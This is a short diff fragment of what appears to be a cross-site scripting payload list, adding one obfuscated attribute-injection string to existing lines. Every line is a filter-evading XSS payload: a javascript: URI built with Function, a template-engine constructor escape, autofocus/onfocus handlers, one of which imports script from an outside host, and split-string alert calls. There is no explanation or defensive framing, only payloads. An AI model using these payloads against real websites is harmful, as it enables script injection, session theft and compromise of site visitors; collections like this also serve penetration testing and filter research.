@@ -17,3 +17,4 @@ javascript:new%20Function`al\ert\`1\``;
 {{constructor.constructor(alert`1`)()}}
 <A HRef=//site.com AutoFocus %26%2362 OnFocus%0C=import(href)>
 '; k='e '%0Atop['al'+k+'rt'](1)//
+*"><A HREF=\" AutoFocus OnFocus=top/**/?. ['ale '%2B'rt'](1)>
